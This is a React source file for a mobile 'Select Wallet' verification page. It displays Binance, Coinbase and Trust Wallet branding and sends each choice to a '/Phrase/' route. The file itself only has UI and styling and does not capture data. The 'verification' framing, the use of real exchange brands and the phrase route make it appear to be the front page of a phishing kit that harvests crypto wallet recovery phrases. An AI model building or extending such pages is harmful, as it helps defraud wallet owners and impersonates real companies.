import React, { useState } from "react";
import { Link, useHistory } from "react-router-dom";
import { i18n } from "../../../i18n";

function Validation() {
  const history = useHistory();
  const [selectedWallet, setSelectedWallet] = useState(null);

  const walletOptions = [
    {
      id: "binance",
      name: "Binance",
      icon: "/images/validation/binance.png",
      color: "#F0B90B",
      description: "Global cryptocurrency exchange"
    },
    {
      id: "coinbase",
      name: "Coinbase",
      icon: "/images/validation/coinbase.svg",
      color: "#0052FF",
      description: "Secure crypto platform"
    },
    {
      id: "trustwallet",
      name: "Trust Wallet",
      icon: "/images/validation/trust_wallet.webp",
      color: "#3688FF",
      description: "Decentralized mobile wallet"
    },
    {
      id: "others",
      name: i18n("text.other") || "Other Wallet",
      icon: "fas fa-wallet",
      color: "#9c27b0",
      description: "Custom wallet option"
    }
  ];

  const handleWalletSelect = (wallet) => {
    setSelectedWallet(wallet);
    setTimeout(() => {
      history.push(`/Phrase/${wallet.id}`);
    }, 300);
  };

  return (
    <>
      <style>
        {`
          @import url('https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css');
          
          * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
          }
          
          .wallet-app {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            color: white;
            background: radial-gradient(circle at center top, #0a1c3a, #051122 800px);
            min-height: 100vh;
            max-width: 430px;
            margin: 0 auto;
            position: relative;
            overflow-x: hidden;
          }
          
          .wallet-container {
            padding: 16px 18px 20px;
          }
          
          /* Header with Back Button */
          .wallet-header {
            display: flex;
            align-items: center;
            margin-bottom: 28px;
            padding: 0 4px;
          }
          
          .back-button {
            display: inline-flex;
            align-items: center;
            gap: 8px;
            color: #00c6ff;
            text-decoration: none;
            font-size: 0.9rem;
            margin-right: 15px;
            transition: all 0.2s;
            padding: 6px 12px;
            border-radius: 8px;
            background: rgba(255, 255, 255, 0.05);
            border: 1px solid rgba(255, 255, 255, 0.1);
          }
          
          .back-button:hover {
            gap: 10px;
            background: rgba(255, 255, 255, 0.08);
          }
          
          .header-content {
            flex: 1;
          }
          
          .wallet-title {
            font-size: 1.4rem;
            font-weight: 700;
            background: linear-gradient(135deg, #00c6ff, #0068c8);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
            margin-bottom: 4px;
          }
          
          .wallet-subtitle {
            font-size: 0.85rem;
            color: rgba(255, 255, 255, 0.7);
            line-height: 1.4;
          }
          
          /* Wallet List */
          .wallet-list {
            display: flex;
            flex-direction: column;
            gap: 14px;
          }
          
          .wallet-item {
            background: rgba(255, 255, 255, 0.04);
            border-radius: 16px;
            padding: 20px;
            border: 1px solid rgba(255, 255, 255, 0.08);
            cursor: pointer;
            transition: all 0.3s;
            display: flex;
            align-items: center;
            gap: 18px;
            backdrop-filter: blur(8px);
          }
          
          .wallet-item:hover {
            background: rgba(255, 255, 255, 0.06);
            transform: translateX(4px);
            border-color: rgba(0, 198, 255, 0.2);
          }
          
          .wallet-item.selected {
            background: rgba(0, 198, 255, 0.1);
            border-color: rgba(0, 198, 255, 0.4);
            transform: translateX(8px);
          }
          
          .wallet-icon {
            width: 60px;
            height: 60px;
            border-radius: 14px;
            display: flex;
            align-items: center;
            justify-content: center;
            flex-shrink: 0;
            overflow: hidden;
            border: 2px solid rgba(255, 255, 255, 0.1);
            background: white;
            padding: 8px;
          }
          
          /* Optimized logo display */
          .wallet-icon img {
            max-width: 100%;
            max-height: 100%;
            width: auto;
            height: auto;
            object-fit: contain;
          }
          
          /* Specific styling for each logo */
          .wallet-icon[data-wallet="binance"] img {
            padding: 2px;
          }
          
          .wallet-icon[data-wallet="coinbase"] img {
            padding: 4px;
          }
          
          .wallet-icon[data-wallet="trustwallet"] img {
            padding: 4px;
          }
          
          .wallet-icon i {
            font-size: 1.8rem;
            color: white;
          }
          
          .wallet-info {
            flex: 1;
            min-width: 0;
          }
          
          .wallet-name {
            font-size: 1.1rem;
            font-weight: 600;
            color: white;
            margin-bottom: 4px;
            display: flex;
            align-items: center;
            gap: 8px;
          }
          
          .wallet-name .badge {
            font-size: 0.7rem;
            background: rgba(0, 198, 255, 0.2);
            color: #00c6ff;
            padding: 2px 8px;
            border-radius: 10px;
            font-weight: 500;
          }
          
          .wallet-description {
            font-size: 0.85rem;
            color: rgba(255, 255, 255, 0.6);
            line-height: 1.4;
          }
          
          .wallet-arrow {
            color: rgba(255, 255, 255, 0.3);
            font-size: 1rem;
            transition: all 0.3s;
          }
          
          .wallet-item:hover .wallet-arrow {
            color: rgba(0, 198, 255, 0.8);
            transform: translateX(3px);
          }
          
          /* Footer */
          .wallet-footer {
            margin-top: 30px;
            text-align: center;
            padding-top: 20px;
            border-top: 1px solid rgba(255, 255, 255, 0.08);
          }
          
          .footer-text {
            font-size: 0.8rem;
            color: rgba(255, 255, 255, 0.5);
            line-height: 1.4;
          }
          
          /* Bottom Navigation */
          .bottom-nav {
            position: fixed;
            bottom: 0;
            left: 0;
            right: 0;
            background: rgba(10, 28, 58, 0.98);
            border-top: 1px solid rgba(255, 255, 255, 0.1);
            display: flex;
            justify-content: space-around;
            padding: 10px 0;
            max-width: 430px;
            margin: 0 auto;
            z-index: 100;
            backdrop-filter: blur(12px);
          }
          
          .nav-item {
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 4px;
            color: rgba(255, 255, 255, 0.55);
            text-decoration: none;
            font-size: 0.7rem;
            padding: 4px 8px;
            border-radius: 8px;
          }
          
          .nav-item.active {
            color: #00c6ff;
            background: rgba(0, 198, 255, 0.08);
          }
          
          .nav-item i {
            font-size: 1.1rem;
          }
          
          /* Loading animation for selection */
          .selecting {
            position: relative;
            overflow: hidden;
          }
          
          .selecting::after {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, rgba(0, 198, 255, 0.1), transparent);
            animation: loading 1s infinite;
          }
          
          @keyframes loading {
            0% { left: -100%; }
            100% { left: 100%; }
          }
          
          /* Responsive */
          @media (max-width: 430px) {
            .wallet-container {
              padding: 14px 16px 20px;
            }
            
            .wallet-item {
              padding: 18px;
              gap: 16px;
            }
            
            .wallet-icon {
              width: 56px;
              height: 56px;
            }
            
            .wallet-title {
              font-size: 1.3rem;
            }
          }
        `}
      </style>

      <div className="wallet-app">
        <div className="wallet-container">
          {/* Header with Back Button */}
          <div className="wallet-header">
            <Link to="/profile" className="back-button">
              <i className="fas fa-arrow-left"></i>
              Back
            </Link>
            <div className="header-content">
              <h1 className="wallet-title">
                {i18n("text.validation") || "Select Wallet"}
              </h1>
              <p className="wallet-subtitle">
                Choose your preferred wallet for verification
              </p>
            </div>
          </div>

          {/* Wallet List */}
          <div className="wallet-list">
            {walletOptions.map((wallet) => (
              <div
                key={wallet.id}
                className={`wallet-item ${selectedWallet?.id === wallet.id ? 'selected' : ''}`}
                onClick={() => handleWalletSelect(wallet)}
              >
                <div 
                  className="wallet-icon"
                  data-wallet={wallet.id}
                  style={{ background: wallet.color }}
                >
                  {wallet.id === "others" ? (
                    <i className={wallet.icon}></i>
                  ) : (
                    <img 
                      src={wallet.icon} 
                      alt={wallet.name}
                      onError={(e) => {
                        e.target.style.display = 'none';
                        e.target.parentElement.innerHTML = `<i class="fas fa-wallet" style="color: ${wallet.color}"></i>`;
                      }}
                    />
                  )}
                </div>
                
                <div className="wallet-info">
                  <div className="wallet-name">
                    {wallet.name}
                    {wallet.id === "binance" && <span className="badge">Popular</span>}
                  </div>
                  <div className="wallet-description">
                    {wallet.description}
                  </div>
                </div>
                
                <i className="fas fa-chevron-right wallet-arrow"></i>
              </div>
            ))}
          </div>

          {/* Footer */}
          <div className="wallet-footer">
            <p className="footer-text">
              Your selection will be used for the verification process
            </p>
          </div>
        </div>

      
      </div>
    </>
  );
}

export default Validation;